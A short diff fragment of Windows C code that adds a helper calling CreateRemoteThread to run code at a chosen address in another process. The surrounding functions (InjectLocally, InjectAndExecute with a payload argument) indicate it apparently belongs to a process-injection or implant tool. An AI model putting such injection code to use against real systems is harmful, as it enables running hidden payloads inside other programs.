@@ -207,6 +207,11 @@ char* InjectLocally(char* payload, int size)
 	return NULL;
 }
 
+BOOL ExecuteViaCreateRemoteThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter)
+{
+	return CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL) != NULL;
+}
+
 void InjectAndExecute(INJECTION* injection, char* payload, int size, int pOffset, char* parameter)
 {
 	char* target;
